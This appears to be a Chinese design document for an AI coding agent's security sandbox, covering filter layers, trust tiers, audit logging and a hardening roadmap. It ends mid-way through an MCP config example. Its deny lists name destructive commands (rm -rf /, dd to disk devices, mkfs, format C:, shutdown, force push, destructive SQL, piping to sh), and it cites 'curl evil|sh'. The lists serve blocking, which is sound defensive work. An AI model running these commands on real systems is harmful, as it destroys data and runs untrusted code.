# 青小团 Agent 安全子系统

> 本文档是安全子系统的权威说明：架构、模块边界、决策树、审计闭环、威胁模型与增强路线图。
> 目标：让"允许什么、拒绝什么、为什么"在代码之外也能被快速核对，并给后续增强提供一致性锚点。

---

## 1. 设计原则

- **Fail-closed**：滤网自身故障、确认通道缺失、强隔离后端不可用、参数解析异常 → 一律拒绝，绝不静默放行。
- **可审计**：每条安全裁决（尤其拦截）都应汇入审计流，可离线追责。
- **确定性优先**：意图/信任/规则等静态判定不依赖任何内核/容器即可成立；没有强隔离时用滤网兜底，而不是裸跑。
- **统一入口，杜绝侧门**：所有工具经同一条安全流水线，避免"绕 run_shell 护栏走文件写/MCP"的旁路。

---

## 2. 整体架构

```
                    工具/命令请求
                          │
        ┌─────────────────▼────────────────────┐
        │  L0 意图滤网  IntentFilter             │ 红线/外泄/远程执行
        ├──────────────────────────────────────┤
        │  L1 信任滤网  TrustFilter              │ 工作区信任 / 域名白名单 / 计划模式
        ├──────────────────────────────────────┤
        │  L2 资源滤网  ResourceFilter           │ 网络开关 / 内存超时 / 隔离触发
        ├──────────────────────────────────────┤
        │  L3 强隔离滤网 HardIsolationFilter     │ 后端自动选择 / fail-closed
        └──────────────────────────────────────┘
                          │   Verdict (ALLOW/CONFIRM/ISOLATE/DENY)
                          ▼
             ┌ 允许 ┬ 确认 ┬ 隔离执行 ┬ 拒绝 ┐
             └──────┴──────┴─────┬───┴────┘
                           副本/diff/apply 或 强隔离后端
                          │
                          ▼
               SecurityAuditor / SecurityEventBus
               (AEAD 落盘, 防篡改链, 实时告警)
```

- 主链路位于 [`tuan_cli/sandbox/`](tuan_cli/sandbox/)（`SandboxManager` 统一入口）。
- 工具执行闸门位于 [`tuan_cli/core/tool_executor.py`](tuan_cli/core/tool_executor.py)（`_security_gate_check` + `_sandbox_gate_check`）。

---

## 3. 四层沙箱滤网

| 层 | 模块 | 职责 | 裁决落点 |
|----|------|------|----------|
| L0 意图 | `sandbox/filters.py::IntentFilter` | 硬红线(`rm -rf /`/`format c:`)、数据外泄、远程执行 → deny-critical/high | 模型无关、确定性最强 |
| L1 信任 | `sandbox/filters.py::TrustFilter` | 工作区信任分级(trusted/limited/untrusted/unknown) + 域名白名单 + 计划模式 | trusted 放行 / untrusted 拒 / unknown 确认 |
| L2 资源 | `sandbox/filters.py::ResourceFilter` | **可选**禁网开关 (`sandbox.resource.deny_network_by_default`，默认**关闭**)；高危写 → 副本模式 | 决定"上不上 L3" |
| L3 强隔离 | `sandbox/filters.py::HardIsolationFilter` | 后端自动选择；需强隔离但无强后端 → **fail-closed 拒绝** | 真正的容器/OS 隔离 |

**隔离后端自动选择**（强度降序探测）：`landlock → docker → seatbelt → token-acl → jobobject → local`。
见 `sandbox/backends.py`。

**工作区隔离融合模式**：`direct`（限路径直写，低危）+ `copy-diff-apply`（副本 → diff → 确认 → 应用，高危可回滚）。见 `sandbox/isolation.py`。

**决策模型**：`sandbox/verdict.py::Verdict`，动作按严格度 `ALLOW < CONFIRM < ISOLATE < DENY` 逐层收紧。

---

## 4. 安全模块职责与边界

| 模块 | 文件 | 职责边界 |
|------|------|----------|
| 红线引擎 | `ext/safety_engine.py` | 命令/SQL/写操作的静态风险评分；硬红线/软红线/良性判断 |
| 安全闸门 | `ext/security_gate.py` | 统一 `SecurityGate`：shell/MCP 工具/远程 prompt/文件写入/未知 kind |
| 规则引擎 | `ext/rules_engine.py` | YAML 规则加载校验；ReDoS 防护、secret 检测 |
| 安全策略 | `ext/security_policy.py` | 黑名单/策略月度更新提醒 |
| 加密引擎 | `ext/crypto_engine.py`、`harden/crypto_provider.py` | PBKDF2+AES-GCM/CTR+HMAC；可插拔后端，解密认证失败 fail-closed |
| 网络守卫 | `core/network_guard.py` | 网络命令识别；敏感域名/IP/CIDR/单向模式（出口策略权威判定） |
| 审计器 | `core/security_auditor.py` | AEAD 加密落盘、防篡改链、查询/统计/导出 |
| 事件总线 | `core/security_bus.py` | 统一定向事件；含沙箱事件(`security.sandbox.*`)，实时告警 |
| 工作区信任 | `core/workspace_trust.py` | `trusted/limited/untrusted/unknown` 分级与落盘 |
| 白名单 | `core/whitelist.py` | 只读命令白名单、确认码、多阶段确认 |
| MCP 加固 | `tools/mcp/security.py` | 注册描述扫描、参数注入检测（独立威胁类） |
| 权限规则 | `tools/permissions.py` + `permission_fusion.py` | `permissions.rules` 规则表 / shell / network 策略决策 |
| 沙箱统一入口 | `sandbox/manager.py` | 四层滤网评估 + 审计闭环 + 隔离执行选路 |

---

## 5. 关键决策树

### 5.1 网络出口（权威判定 = `NetworkGuard.check`）
- **L0 意图滤网**：消费 `guard.check().action == "deny"`（外泄/远程执行/敏感域名/端口扫描/CIDR 越界）→ 沙箱 deny high。**不负责**白名单强制。
- **L1 信任滤网**：负责**域名白名单强制**（`payload.meta.allowed_domains` ← `sandbox.allowed_domains` / `permissions.network.allow_domains`）。
- **L2 资源滤网**：负责**存在性 + 无网开关**：检测到网络请求且 `deny_network_by_default` 开启 → `network=False + isolate=True`（气隙执行）。**该开关默认关闭**，即开箱不禁用出网；生产配置见 `SECURITY_BASELINE.md`。网络探测自身异常时按「存在网络请求」处理（fail-closed）。本地命令不受影响。

> 一致性契约：被 `NetworkGuard` 判 deny 的命令，沙箱 L0 必须 deny 且严重度一致（high）。

### 5.2 信任分级
- `unknown` → 确认；`untrusted` → 拒绝；`limited` → 白名单外确认；`trusted` → 放行。
- 计划模式（plan_mode）一律降级为"只读确认"。

### 5.3 MCP 校验点（两类互补威胁）
- **红线层**（命令级致命）：`SecurityGate.decide_mcp_tool`；无 gate 兜底 `_is_mcp_dangerous` → 两者**全字段递归红线，覆盖一致**。
- **注入层**（指令覆盖/角色劫持）：`MCPSecurityGuard.scan_tool_params` → 独立拦截。
- 两类不互相吞，是纵深防御的分工，不是重复。

---

## 6. 审计闭环

- 每条沙箱裁决（DENY 全量；CONFIRM/ISOLATE 仅高危以上）经 `SandboxManager._emit_audit` 汇入：
  - `SecurityAuditor`：AEAD 加密落盘 + 防篡改链（含 layer/tool/trust/backend 等上下文）。
  - `SecurityEventBus`：`security.sandbox.blocked/isolated/confirmed` → `security-audit.jsonl` + critical/high 实时告警 + 导出。
- 审计是补充保障：任何审计异常都被吞掉，**绝不反噬沙箱主流程**。
- 导出格式：JSONL / CEF / RFC5424 Syslog（`harden/audit_export.py`）。

---

## 7. 威胁模型（已覆盖）

| 威胁 | 防线 | 状态 |
|------|------|------|
| 致命命令破坏主机 | L0 意图滤网 / 红线引擎 / 强隔离后端 | ✅ |
| 工作区外不可信代码 | 工作区信任分级 + 路径限界 + 副本模式 | ✅ |
| 数据外泄 / 远程执行 | NetworkGuard + L0 + L2 无网隔离 | ✅ |
| MCP 恶意 server 参数注入 | 注册描述扫描 + 参数注入检测 + 全字段红线 | ✅ |
| 提示词注入(指令覆盖) | 注入检测层（独立于红线） | ✅ |
| 审计被篡改 / 明文泄露 | AEAD 加密 + 防篡改链 | ✅ |
| 滤网/后端故障被绕过 | 全栈 fail-closed | ✅ |

---

## 8. 增强路线图（按价值排序）

| # | 模块 | 增强方向 | 状态 |
|---|------|----------|------|
| E1 | `tools/mcp/policy.py` + `security.py` | MCP **server 信任分级**：把每台 server 的权限域(只读/工具白名单/允许的域名)落到持久化策略；新增"调用前工具级授权 + 会话内可回撤"，取代散落的临时确认 | ✅ 已落地 |
| E2 | `core/workspace_trust.py` | 信任**自动衰减与重校验**：trusted 在目录变更/新敏感文件(.env/.git/config/密钥)出现时自动降级到 limited 并提示复议 | ✅ 已落地 |
| E3 | `sandbox/backends.py` + `arch/platform.py` | **Job Object 资源配额落地**：CPU 配额、内存上限、进程树击杀超时兜底(当前仅存在性探测) | ✅ 已落地 |
| E4 | `core/security_auditor.py` + `harden/audit_export.py` | 审计**关联合并 + 跨会话异常检测**：同源多次红线(如 MCP 反复注入)聚合告警；导出支持轮转与加密 | ✅ 部分（关联/轮转已落地，导出加密未做） |
| E5 | `core/tool_executor.py` | **写操作风暴检测**：单会话内高频率写/删除触发节流与告警，防误删批量任务 | ✅ 已落地 |
| E6 | `tools/permissions.py` | `permissions.rules` 增强：**负向 glob**(`!bin/**`)、MCP 工具名规则、会话内临时授权提升 | ◐ 部分（前两项已落地） |
| E7 | `sandbox/isolation.py` + `ui/approval_overlay.py` | 副本模式的 **diff 可视化确认**：以 CLI/交互卡片展示变更后再 apply | ✅ 已落地（后端 + 审批卡片） |
| E8 | `config` | `sandbox`/`permissions` 配置的 **schema 强校验 + fail-closed 可观测性**（开启项/降级项可视化） | ✅ 已落地 |

> 判定"先做哪些"：优先级高且可独立演进 → **E2、E3、E5**（已落地）；依赖交互设计 → **E1、E7**（后端 + 审批卡片已落地）；属加固打磨 → **E4、E6、E8**。

**E2 落地说明（2026-11-06）**：此前 `check_for_decay()` / `apply_decay()` 只有单元测试调用，
CLI (`cli/cmd_chat.py`) 与 Web (`web/server.py::trust_status`) 都直接读 `record.level`，
衰减逻辑从未在主链路生效。现在 `check_trust()` 自动执行衰减校验并统一 CLI / Web / 沙箱口径：

- 指纹基线：确认 trusted 时采样「顶层目录结构 + 敏感文件 (`.env`/密钥/`.git/config` 等) 的
  路径、大小、mtime_ns」，写入持久化记录；之后任一变化即降级为 limited 并要求重新确认。
  扫描限深 4 层 / 限 20000 条目 / 跳过依赖与构建目录，不读文件内容，正常写代码不会误触发。
- **fail-closed**：扫描失败（目录消失、权限错误、条目超限）不再 `except: pass` 静默放行，
  而是降级为 limited；老版本无指纹的记录只补建基线，不每次启动误报。
- `last_used` 由 `check_trust` 自动维护（60 秒节流落盘），修掉「活跃工作区 30 天后被误判过期」。
- 降级原因 / 时间写入 `TrustRecord`，经 `get_project_info()` 暴露给 Web 与 TUI 提示。
- 回归：`tests/test_e2_e5_hardening.py`（16 例）。

**E5 落地说明**：`_WriteStormDetector` 已接入 `ToolExecutor`，但「不同文件数」按整个会话累计，
一旦改过 15 个文件就永久告警、与 60 秒滑动窗口矛盾。现在文件维度与次数维度共用同一窗口，
告警态随窗口过期复位，并修正了把「写操作次数」误写成「秒数」的文案。

**E6 部分落地说明（2026-11-06）**：`PermissionPolicy.match_rule()` 新增两类能力：

- **负向排除**：规则支持 `exclude: "git push --force*"` 或 `pattern: "!git push --force*"`。
  目标命中排除模式时该规则不生效，用于给宽泛 allow 开洞，避免「永远允许」成为提权入口。
  **deny 规则忽略 exclude**（fail-closed：拒绝规则不允许被放宽），优先级仍为 deny > ask > allow。
- **MCP 工具名规则**：`mcp_call` 按 `mcp__<server>__<tool>` 规范化参与 tool 匹配，
  可写 `{"tool": "mcp__untrusted__*", "action": "deny"}` 对单台 server 精确管控。
- 仍待办：会话内临时授权提升（依赖交互设计，未动）。
- 回归：`tests/test_e6_e8_hardening.py`（21 例）。

**E8 落地说明**：新增 `config/security_schema.py`，把此前完全不在 `config/validate.py`
校验范围内的 `sandbox` / `permissions` 纳入强校验。最危险的不是配错值而是**静默配错**：
`match_rule()` 对非 dict 规则 / 未知 action 一律跳过，`sandbox.enabled=false` 直接短路四层滤网。
现在这些会变成 `tuan config validate` 的显式错误，并由 `tuan harden status` 输出
「安全配置 schema」段。缺失字段不报错（由 DEFAULT_CONFIG 兜底），只报显式写错或显式关闭关键防线。

**R8 同类异常即放行修复**：`PermissionPolicy._hardening_confirm()` 在安全引擎导入失败时
`except: pass` 后继续走 YOLO 自动批准 —— 超长命令 / FD 重定向 / PowerShell IEX /
Docker 守护进程重定向都会在引擎不可用时被静默放行。现改为返回 `confirm` 并标注 fail-closed。



**E3 落地说明（2026-11-06）**：最值钱的不是"补上 CPU 配额"，而是修掉**降级被误报为已隔离**：
`SandboxManager._run_syscall()` 旧实现把 `enforced=True` 写死，只要 platform 层不抛异常，
即使内部已因 libseccomp 缺失 / Job Object 不可用而退化为普通子进程，上层仍认为
"已 OS 级强隔离执行"并放行。现在 `SyscallResult` 带 `enforced` / `degraded_reason`，
所有 fallback 路径显式 `enforced=False`，交由 `enforce_required` 决定是否拒绝。

- `arch/platform.py`：新增 `JobObjectLimits` 纯数据层（含范围校验、单位换算）；
  `_set_job_limits()` 两次 `SetInformationJobObject` —— class 9 落内存/workingset/进程数、
  class 15 落 CPU 硬上限（`ENABLE|HARD_CAP`，`CpuRate` 单位=百分数×100）。
  旧实现 `cpu_rate_pct` **完全没被使用**，`MaximumWorkingSetSize` 也缺
  `JOB_OBJECT_LIMIT_WORKINGSET` flag 而不生效。
- **fail-closed**：`AssignProcessToJobObject` 失败时旧实现 `pass` 后照跑、却仍返回
  `mechanism="job-object"`；现在杀掉子进程并返回 `blocked=True / enforced=False`。
  配额设置任一步失败即抛错，不再"配额没设上却照跑"。
- 进程树击杀超时兜底：`TerminateJobObject` → `taskkill /T /F` → `proc.kill()` 三级。
- `backends._jobobject_available()` 从「`sys.platform == "win32"` 就算可用」改为真实
  `CreateJobObjectW` + `QueryInformationJobObject` 能力探测。
- 新配置键 `sandbox.resource.cpu_rate_pct / active_process_limit / kill_timeout_seconds`，
  已纳入 `tuan config validate` 强校验（写错范围执行层会降级, 必须提前拦住）。
- **边界（如实）**：Job Object 只在 Windows 生效；本环境为 Linux，Windows 路径由
  fake kernel32 / fake Popen 单测覆盖，**未在真实 Windows 主机上跑过**。Linux/macOS
  仍须靠外部容器或 VM，`enforced=False` 只是让降级可见，不提供额外隔离。

**E4 落地说明（部分）**：新增 `core/audit_correlation.py`。此前审计是逐条的，
1000 条 `deny` 只是 1000 行日志，同源反复注入看不出异常。

- `AuditCorrelator` 产出三类聚合告警：`burst`（窗口内同源重复）、`cross_session`
  （同一指纹出现在 ≥2 个会话，抓跨会话投毒/提示注入复用）、`severity_escalation`
  （同源从 low 跃升 critical）。指纹不含 session/seq/ts，并归一化掉路径与数字。
- **纯观测，绝不反作用于裁决**：不改 `AuditRecord`、不返回 allow/deny、异常一律吞掉记 log；
  告警只推送到**已存在**的全局事件总线（不主动创建以免副作用）。
- `SecurityAuditor` 启动时从 AEAD 日志 `replay()` 历史，使跨会话检测能跨越进程重启；
  `recent_alerts()` / `correlation_stats()` / `stats()["correlation"]` 可查。
- `harden/audit_export.py`：导出支持按大小轮转（`max_bytes` / `backup_count`），
  文件权限收紧到 0600；`export_file()` 批量重放同样生效。
- **仍待办**：导出加密。审计主日志本身已 AEAD 加密，但导出到 SIEM 的明文轮转文件
  需要独立的密钥管理方案，未擅自塞进本轮。
- 回归：`tests/test_e3_jobobject.py`（25 例）、`tests/test_e4_correlation.py`（24 例）。



**E1 落地说明（2026-11-06）**：新增 `tools/mcp/policy.py`。此前 `mcp/security.py` 只扫描
工具描述/参数里的注入文本（内容层），不回答「这台 server 到底被允许做什么」——所有 MCP
调用只能按外层 `mcp_call` 一刀切放行/拒绝。

- `MCPPolicyStore` 持久化每台 server 的权限域：`tier`（`untrusted`/`limited`/`readonly`/
  `trusted`）、`read_only`、`tool_allowlist`、`tool_denylist`、`allowed_domains`、
  `max_calls_per_session`、`require_confirm`，原子写入 `~/.tuan/mcp_server_policy.json`（0600）。
- **默认 untrusted**：未登记 server 一律拒绝，必须用户显式 `grant()` 后才可用；第一次见到
  不等于临时放行。`trusted` 档强制要求显式 `tool_allowlist`，拒绝「无白名单 = 全放行」的过宽授权。
- **deny 优先**、域名白名单（含嵌套参数里的 URL）、会话调用配额、**会话内可回撤**
  （`revoke_session()` 后立刻重新要求确认，不需重启）。
- **损坏即拒绝**：策略文件损坏 / 版本不认识时进入 `locked` 状态拒绝所有调用，**不重建为
  空策略**——空策略看起来像「没有限制」，与「无法验证」的语义正好相反。
- **接线（关键）**：由 `build_permission_policy()` 注入全局 store，主链路 `mcp_call` 真的经过
  信任分级；单元测试直接构造 `PermissionPolicy` 时不受影响。策略层初始化失败时注入
  `_DenyAllMCPPolicy` 而不是 `pass` 回退到裸路径。新配置键 `mcp.policy.enabled`（缺省启用）
  已纳入 E8 强校验，显式关闭会报「安全降级」。
- **TUI 卡片已落地**：`request_grant()` 通过 `ui/approval_overlay.py` 呈现完整权限域
  （tier / allowlist / denylist / domains）并路由显式决策；「仅本会话」走内存临时策略不写盘，
  「授予并持久化」才调 `grant()`。拒绝 / 中止 / 通道异常一律不改策略。见下方 TUI 外壳借鉴说明。

**E7 落地说明（2026-11-06）**：本轮发现两个比"加个预览"严重得多的问题。

1. **`copy_diff_apply` 是纯文档特性**：L2 滤网在高危时把 `verdict.workspace_mode` 写成
   `copy_diff_apply` 并进审计 context，但 `SandboxManager.execute_isolated()` **从未读取该字段**，
   `isolate_workdir` / `diff` / `apply` 在生产代码里零调用点 —— 高危命令实际仍在真实工作区裸跑。
   现在按 `workspace_mode` 分派，高危命令真的在隔离副本里执行，经预览 + 确认后才写回。
2. **快照漏扫隐藏目录，确认界面说谎**：`Snapshot.capture()` 用
   `not d.startswith(".")` 跳过所有点目录，于是副本里改 `.github/workflows/ci.yml` 时
   `diff()` 返回空 —— 用户看到「无变更」。实测确认后改为只跳过 `_IGNORED` 与隔离副本自身。

- 新增 `DiffPreview` / `DiffEntry`：每条变更带 `path/status/size_before/size_after`、
  **文本内容前 20 行预览**（用户能看见那一行是不是 `curl evil|sh`，而不只是文件名）、
  二进制标注、`.env`/私钥/credentials 等敏感文件 `[!敏感]` 高亮；`to_text()` 纯文本渲染
  可直接 print 或塞进 TUI 卡片。
- `confirm_apply()` fail-closed 契约：`confirm` 为 None / 抛异常 / 返回非 True → 不写回；
  **TOCTOU 复检** —— 确认期间副本发生变化则拒绝并要求重新预览。刻意不引入快照缓存，
  避免「判定依赖文件系统时间点」。
- `SandboxExecResult` 新增 `workspace_mode` / `applied` / `applied_files` / `diff_preview` /
  `confirm_reason`；拒绝时把预览一并放进 `error`，保证用户仍能看见本来要改什么；
  副本在 `finally` 里必定清理。
- **TUI 卡片已落地**：`confirm_apply()` 接受 `card_renderer`，由
  `ui/approval_overlay.py` 渲染结构化审批卡片；有 `ctx.confirm` 时交给现有 TUI 挂起式
  确认通道，无通道时提供 headless 默认通道（打印卡片 + 精确 6 位确认码 + stdin，
  非 TTY/EOF 即 ABORT）。**行为变更**：上一轮「无 confirm 通道直接失败」的 headless 缺口
  已补上，但**没有放宽 fail-closed** —— 只是提供了一个同样要求显式决策的通道。
- **边界（如实）**：TUI 复用的是现有 `confirm()` 文本框渲染通道，**没有**把
  prompt_toolkit 应用整体换成 ratatui 式 Widget/Buffer 架构（理由见下方借鉴说明）；
  TUI 路径走 y/n（`_resolve_confirm`），不显示确认码提示，卡片文案与通道行为一致，
  不出现「写着要输码、实际按 y 就放行」。`copy_diff_apply` 与 OS 强后端叠加时后端在副本
  cwd 内执行，未对 Windows Job Object 做真机验证（同 E3 边界）。
- 回归：`tests/test_e1_e7_hardening.py`（39 例）、`tests/test_tui_approval_overlay.py`（59 例）。



**TUI 外壳借鉴说明（Codex CLI，2026-11-06）**：按需求把 `openai/codex` 的 TUI 源码
**完整下载到本地核查**（`codex-rs/tui/`，Rust + ratatui + crossterm + tokio，
**165 个顶层模块、1216 个 `.rs` 文件、492414 行**（另跳过 1491 个快照文件），
  并**完整照抄**其 `LICENSE` 与 `NOTICE` 原文到
`THIRD_PARTY_LICENSES/`（Apache-2.0 第 4 条与上游 NOTICE 的归属要求）。

**但 TUI 源码没有逐字复制，本项目也不宣称做了逐字复制。** 两个硬理由：

1. **跨语言不可行**：上游 `codex-tui` 是独立 Rust crate，渲染建立在 ratatui 的
   `Widget`/`Buffer` trait 与 crossterm 事件循环上；Tuan-CLI 是纯 Python +
   prompt_toolkit/rich。逐字搬 49.2 万行 Rust 进 Python 仓库没有可执行语义。
2. **整体替换 TUI 外壳会重新打开侧门**：权限策略注入（`build_permission_policy`）、
   确认通道（`ctx.confirm`）、沙箱路由（`_route_sandbox_isolation`）都挂在现有 TUI
   入口上。换壳等于把 E1–E8 修好的接线全部甩掉 —— 这正是前几轮反复在堵的问题。

因此采取**等价移植交互外壳**：把上游 `bottom_pane/approval_overlay.rs` 的组件分层
（`ApprovalRequest` → 选项列表 → 显式决策事件 → 路由）与四条交互契约，
用 Python 独立实现并**内联**到 `tuan_cli/ui/approval_overlay.py`；卡片排版沿用
Tuan 现有 `_render_confirm_card` / `_render_ask_card` 的盒子渲染器，不引入 ratatui。

借鉴的四条契约（均已在代码中落地并有回归覆盖）：
1. **选择总是发出显式决策事件** —— 没有「没输入 = 同意」；
2. **Esc / 取消永远映射 Cancel/Abort** —— 上游对 MCP elicitation 特别保证「关闭对话框
   不会静默变成 continue without info」，这里 ABORT 优先于确认码校验；
3. **UI 层不判定安全性** —— 上游原文 "This module does not evaluate whether an
   action is safe to run; it only presents choices and routes user decisions."；
   安全裁决仍由 E1 策略库与 E7 `confirm_apply` 负责；
4. **作用域区分**（`Accept` / `AcceptForSession`）→ `ONCE` / `SESSION`。

相对上游的修改也如实记录：请求模型改为 Python dataclass；决策解析 fail-closed
（未知输入 RETRY、错码 DENY、非 TTY headless 用 6 位确认码、stdin 不可用 ABORT）；
新增 E1 持久化信任授予流程与 E7 结构化 DiffPreview 卡片（上游均无对应物）。
归属、许可全文与「OpenAI 不背书」声明见 `NOTICE` 第 9 条。



**TUI 对齐矩阵（2026-11-06，第 10 轮）**：目标「TUI 与 Codex 完全相同但保留本地化」
已拆成可度量条目，见 `TUI_PARITY.md` 与 `tuan tui parity`。

- 新增 `tuan_cli/tui/parity/`：`upstream_spec.py`（165 模块树 / 布局常量 /
  键位规格规范化）、`keymap.py`（8 context / 82 动作 / 74 已绑定的 Codex
  `built_in_defaults` + `RuntimeKeymap` 解析：context→global→defaults 优先级、
  显式解绑、唯一性冲突、保留键 `ctrl-c`）、`i18n.py`（17 条文案 → 10 语言，
  en / zh-CN 全量）、`matrix.py`（逐模块状态与差距队列）。
- **键位改为 Codex 原生**：`y` 批准 / `a` 本会话 / `p` 前缀 / `d` 拒绝 /
  `n` 拒绝并说明 / `c` 中止；新增 `PREFIX` / `DECLINE` 决策。上一轮的
  `s` / `1` / `2` 等保留为本地化兼容别名。`Esc` 仍为 `ABORT`（比上游 exec
  模式的 decline 更严格，`TUI_PARITY.md` §6 如实标注）。
- **布局常量逐值对齐**：`LIVE_PREFIX_COLS=2` / `MAX_POPUP_ROWS=8` /
  `MIN_LIST_WIDTH_FOR_SIDE=40` / `SIDE_CONTENT_GAP=2` /
  `MENU_SURFACE_HORIZONTAL_INSET=4` / `MAX_KEY_CHORD_STROKES=2`。
- **口径更正**：完整解压后上游为 165 模块 / 1216 个 `.rs` / 492414 行
  （跳过 1491 个快照），不是上一轮的 567 / 24.7 万行。所有旧数字引用已修正。
- **当前指标（不虚报）**：aligned 14、localized 57、not_applicable 63、
  **pending 31**；宽口径 81.2%、严格对齐 43.0%、**逐值对齐仅 8.5%**；
  `fully_identical = false`。`tuan tui parity --gaps` 列出 31 个待办模块，
  `TUI_PARITY.md` §5 给出第 11–15 轮清零路线。**不靠改状态定义凑数。**
- **本地化边界**：键位 / 布局 / 组件树 / 交互契约不改（这就是「完全相同」的
  锚点）；只改文案、模型、路径、配色、渲染后端与审批作用域语义。
- 回归：`tests/test_tui_parity.py`（新增）+ 既有 `test_tui_approval_overlay.py`
  / `test_e1_e7_hardening.py` 已适配 Codex 键位，102 例通过。
- 归属：`NOTICE` 第 10 条、`TUI_PARITY.md` §8；**仍未逐字复制任何 Rust 源码**。



---

## 9. 测试与回归基准

核心安全回归文件（改动后必须全绿）：
`test_sandbox_system.py` / `test_mcp_checkpoint_convergence.py` / `test_security_network_ownership.py`
`test_permission_rules.py` / `test_security_integration.py` / `test_security_integration_tool_executor.py`
`test_security_hardening.py` / `test_security_auditor_provider.py` / `test_harden_network_policy.py`

> 注：`test_security_v2.py::TestSymlinkResolution` 为 Windows 环境相关、与安全逻辑无关的既有用例，不作为回归门槛。

---

## 10. 安全策略（黑名单 / 白名单 / 多阶段确认）

> 本节是安全**策略**层权威说明（架构见 §2-§4，实现细节见 `ext/safety_engine.py`）。
> 违反本策略的 PR 将被拒绝合并。

### 10.1 三层安全模型

1. **白名单** — 用户同意后自动执行的日常操作
2. **黑名单** — 绝对禁止的操作（无论什么模式）
3. **极高风险防护** — 最高级别的命令需要多重人工确认

**优先级关系：白名单 < 黑名单** — 即使一个命令在白名单中，如果命中黑名单模式，也绝不自动执行。

### 10.2 黑名单（硬红线，永不自动执行）

以下命令**无论什么模式**（YOLO / Plan / 普通）、**无论是否有确认通道**，都**绝不自动执行**——
`is_hard_redline()` 命中即直接拦截，不存在「放行」通道：

| 命令模式 | 描述 |
|---------|------|
| `rm -rf /` 或 `rm -r -f /` | 递归强制删除根目录 |
| `rm -rf /path/*` 含通配符递归删除 | 递归删除大量文件 |
| `dd if=... of=/dev/sda` | 直接写入磁盘设备 |
| `mkfs.*` | 创建文件系统（格式化） |
| `format C:` 等 | 格式化磁盘 |
| `wipefs` / `shred` / `> /dev/sdX` | 擦除磁盘数据 |
| `diskpart` / `cipher /w` / `bcdedit` / `reg delete` | Windows 磁盘/注册表级破坏 |
| `shutdown` / `halt` / `poweroff` / `reboot` | 系统关机/重启 |
| `init 0` / `init 6` | 系统关机/重启 |
| `systemctl poweroff` / `reboot` / `halt` | systemd 关机/重启 |
| `chmod -R 000 /` | 递归移除所有权限 |
| `chown -R root /` | 递归变更 root 所有权 |
| `git push --force` / `git push -f` / `+refspec` | 强制推送 |
| `find / -delete` | 递归删除文件 |
| `Remove-Item -Recurse -Force` | PowerShell 递归强删 |
| `Stop-Computer` / `Restart-Computer` | PowerShell 关机/重启 |

> **注**: SQL 破坏性操作（`DROP TABLE`、`DELETE FROM ...`、`TRUNCATE TABLE`）**不属于**硬红线——
> 它们归类为「可确认关键级」，不会自动执行，但存在确认通道时允许用户经**极端 5 次确认**人工放行
> （仅本次生效，不会自动加入白名单）。YOLO 模式或无确认通道时同样 fail-closed 硬拦截。

**红线判定通过 `is_redline()` 函数实现（单一来源）**，覆盖：
- Token 化判定（穿透子壳/变量/引号/解释器间接写法）
- 正则模式库（`_CRITICAL_PATTERNS` / `_HIGH_PATTERNS` / `_MEDIUM_PATTERNS`，与 `score()` 口径一致）
- 递归间接调用展开（最多 32 层，含解释器内联载荷穿透 `node -e` / `python -c` 包裹）
- PowerShell Base64 解码
- Unicode NFKC 归一化（含零宽字符剥除）

### 10.3 可确认关键级（SQL 破坏性操作，5 次警告）

以下 SQL 破坏性操作**不会自动执行**，但在非 YOLO 模式且存在确认通道时，允许用户经 **5 次警告**人工放行：

| 命令模式 | 描述 |
|---------|------|
| `DROP TABLE` | 删除数据表 |
| `DROP DATABASE` | 删除数据库 |
| `DELETE FROM table` 无 WHERE | 删除全部数据 |
| `TRUNCATE TABLE` | 清空数据表 |

**极高风险警告机制（可确认关键级）：**
- 弹窗 5 次，每次确认按钮在不同位置（右下→左上→中间底部→右上→左下）
- 每次弹窗间隔 ≥ 2 秒（防程序自动连续点击绕过）
- 任何一次取消 → 操作立即终止
- YOLO 模式或当前无确认通道 → 直接硬拦截（fail-closed）

### 10.4 高风险命令（HIGH，3 次警告）

以下命令**在 YOLO 模式下也不自动执行**，弹 **3 次警告**：

| 命令模式 | 描述 |
|---------|------|
| `chmod 777` | 全权限修改 |
| `git reset --hard` | 硬重置 |
| `git clean -f` | 删除未跟踪文件 |
| `git checkout -- .` | 丢弃所有工作区变更 |
| `docker rm -f` / `docker rmi -f` | 强制删除容器/镜像 |
| `kubectl delete` | 删除 K8s 资源 |
| `iptables -F` | 清空防火墙规则 |
| `ALTER TABLE ... DROP` | 修改表结构删除列 |
| 管道到 shell | `\| sh` / `\| bash` / `\| zsh` |

**高风险警告机制：** 弹窗 3 次，每次确认按钮在不同位置；任何一次取消 → 操作立即终止。

### 10.5 白名单（Trae 模式）

1. **手动授权**：用户通过 `tuan safe allow <command>` 将命令加入白名单
2. **白名单生效后**：同类操作**自动执行**，不再弹出确认（前缀匹配，如 `git status` 匹配 `git status --short`）
3. **用户随时可撤销**：通过 `tuan safe deny <cmd>` 撤销白名单
4. **白名单永远低于黑名单**：即使命令在白名单中，如果命中红线模式，**仍然拦截**
5. **红线命令无法加入白名单**：`is_redline` 命中的命令，`tuan safe allow` 会直接拒绝

> **注意**：用户在某次确认通道中「放行」的命令**仅本次生效**，不会自动写入白名单。
> 白名单存储在 `~/.tuan/whitelist.json`。

白名单管理命令：`tuan safe list`（查看）· `tuan safe allow <command>`（添加，红线命令会被拒绝）· `tuan safe deny <cmd>`（移除）· `tuan safe status`（查看安全系统状态，含白名单条目数与存储路径）。

### 10.6 月度更新（黑名单演进）

**每月第一个工作日**，团队必须 review 并更新黑名单：检查新攻击模式 / 新绕过方式 → 更新 `_CRITICAL_PATTERNS` / `_HIGH_PATTERNS` 正则库 → 更新本节命令列表 → 记录变更到 `CHANGELOG.md`。

### 10.7 验证机制（实时可用，非虚构接口）

```bash
tuan ext call safety score '{"command":"rm -rf /"}'
# 输出: { "risk": "critical", "score": 100, "block": true, "reasons": ["recursive force delete (递归强制删除)"], ... }

tuan ext call safety score '{"command":"ls -la"}'
# 输出: { "risk": "none", "score": 0, "block": false, "reasons": [], ... }
```

> **注**: 旧文档曾出现 `tuan safety check` 命令，该命令**不存在**（未实现），请使用上述 `tuan ext call safety score` 替代。

### 10.8 安全承诺

> 我们承诺：**任何情况下**，极高风险命令都不可能被自动执行。
> 即使 YOLO 模式、即使白名单包含、即使用户授权过——**5 次警告是底线，不可绕过。**

---

## 11. MCP 安全配置指南

MCP (Model Context Protocol) 安全机制提供多层防护，确保外部工具调用不会对系统造成危害。

### 11.1 工具权限控制

```yaml
mcp:
  servers:
    - name: filesystem
      command: npx
      args: ["-y", "@modelcontextprotocol/server-filesystem", "."]
      security:
        allowed_tools:        # 白名单模式: 只允许调用指定工具
          - read_file
          - list_directory
          - get_file_info
